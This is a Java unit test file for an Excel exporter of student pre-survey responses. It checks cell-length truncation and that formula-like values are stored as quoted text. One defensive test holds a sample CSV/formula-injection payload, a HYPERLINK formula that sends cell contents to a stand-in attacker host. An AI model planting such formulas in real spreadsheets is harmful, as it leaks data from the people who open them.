package preSurveyResponse.application;

import static org.assertj.core.api.Assertions.assertThat;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.List;

import org.apache.poi.ss.SpreadsheetVersion;
import org.apache.poi.ss.usermodel.CellType;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

import kgu.developers.admin.preSurveyResponse.application.PreSurveyResponseExcelWriter;
import kgu.developers.domain.preSurveyResponse.application.query.PreSurveyResponseRow;
import kgu.developers.domain.preSurveyResponse.domain.PreSurveyResponse;

// 의견에는 길이 제한이 없어서 Excel 셀 한도(32,767자)를 넘는 값이 들어올 수 있다.
// 그 값 하나 때문에 분반 전체 다운로드가 실패하지 않는지 경계값으로 확인한다.
class PreSurveyResponseExcelWriterTest {

    private static final int MAX_CELL_LENGTH = SpreadsheetVersion.EXCEL2007.getMaxTextLength();  // 32,767
    private static final String TRUNCATED_MARK = "…(이하 생략)";
    private static final Long SECTION_ID = 1L;
    private static final int NAME = 1;
    private static final int ROLES = 2;
    private static final int TOPIC_OPINION = 3;
    private static final int ETC_OPINION = 4;

    private final ObjectMapper objectMapper = new ObjectMapper();

    @Test
    @DisplayName("셀 한도와 길이가 같은 의견은 그대로 들어간다")
    void write_KeepsOpinionAtCellLimit() throws Exception {
        String opinion = "가".repeat(MAX_CELL_LENGTH);

        List<String> cells = write(row(opinion, opinion));

        assertThat(cells.get(TOPIC_OPINION)).isEqualTo(opinion);
        assertThat(cells.get(ETC_OPINION)).isEqualTo(opinion);
    }

    @Test
    @DisplayName("셀 한도를 한 글자 넘는 의견은 잘라서 넣고 다운로드는 성공한다")
    void write_TruncatesOpinionOverCellLimit() throws Exception {
        String opinion = "가".repeat(MAX_CELL_LENGTH + 1);

        List<String> cells = write(row(opinion, opinion));

        for (int column : List.of(TOPIC_OPINION, ETC_OPINION)) {
            assertThat(cells.get(column))
                .hasSize(MAX_CELL_LENGTH)
                .startsWith("가".repeat(MAX_CELL_LENGTH - TRUNCATED_MARK.length()))
                .endsWith(TRUNCATED_MARK);
        }
    }

    @Test
    @DisplayName("희망 역할도 셀 한도를 넘으면 잘라서 넣는다")
    void write_TruncatesPreferredRolesOverCellLimit() throws Exception {
        JsonNode roles = objectMapper.createArrayNode().add("백".repeat(MAX_CELL_LENGTH + 100));

        List<String> cells = write(new PreSurveyResponseRow("202412345", "이석민",
            PreSurveyResponse.create("202412345", SECTION_ID, roles, "주제", "기타", null)));

        assertThat(cells.get(ROLES)).hasSize(MAX_CELL_LENGTH).endsWith(TRUNCATED_MARK);
    }

    @Test
    @DisplayName("수식으로 읽힐 수 있는 문자로 시작하는 값은 텍스트 셀로 고정한다")
    void write_QuotePrefixesFormulaLikeValues() throws Exception {
        String attack = "=HYPERLINK(\"http://attacker.example/steal?data=\"&A1,\"클릭\")";

        try (Workbook workbook = workbook(new PreSurveyResponseRow("202412345", "@이석민",
            PreSurveyResponse.create("202412345", SECTION_ID,
                objectMapper.createArrayNode().add("+BACKEND"), attack, "-금요일 회의 어려움", null)))) {
            Row row = workbook.getSheetAt(0).getRow(1);

            for (int column : List.of(NAME, ROLES, TOPIC_OPINION, ETC_OPINION)) {
                assertThat(row.getCell(column).getCellType()).isEqualTo(CellType.STRING);
                assertThat(row.getCell(column).getCellStyle().getQuotePrefixed()).isTrue();
            }
            // 값 자체는 손대지 않아 교수가 원문을 그대로 읽을 수 있다
            assertThat(row.getCell(TOPIC_OPINION).getStringCellValue()).isEqualTo(attack);
        }
    }

    @Test
    @DisplayName("평범한 값에는 인용 접두를 붙이지 않는다")
    void write_KeepsPlainValuesUnquoted() throws Exception {
        try (Workbook workbook = workbook(row("학사 알림 서비스", "금요일 회의 어려움"))) {
            Row row = workbook.getSheetAt(0).getRow(1);

            assertThat(row.getCell(TOPIC_OPINION).getCellStyle().getQuotePrefixed()).isFalse();
            assertThat(row.getCell(ETC_OPINION).getCellStyle().getQuotePrefixed()).isFalse();
        }
    }

    private PreSurveyResponseRow row(String topicOpinion, String etcOpinion) throws IOException {
        return new PreSurveyResponseRow("202412345", "이석민",
            PreSurveyResponse.create("202412345", SECTION_ID, objectMapper.readTree("[\"BACKEND\"]"),
                topicOpinion, etcOpinion, null));
    }

    private Workbook workbook(PreSurveyResponseRow source) throws IOException {
        return new XSSFWorkbook(new ByteArrayInputStream(PreSurveyResponseExcelWriter.write(List.of(source))));
    }

    // 통합문서를 만들어 첫 데이터 행의 셀 문자열을 읽는다.
    private List<String> write(PreSurveyResponseRow source) throws IOException {
        try (Workbook workbook = workbook(source)) {
            Row row = workbook.getSheetAt(0).getRow(1);
            return List.of(
                row.getCell(0).getStringCellValue(),
                row.getCell(1).getStringCellValue(),
                row.getCell(ROLES).getStringCellValue(),
                row.getCell(TOPIC_OPINION).getStringCellValue(),
                row.getCell(ETC_OPINION).getStringCellValue());
        }
    }
}
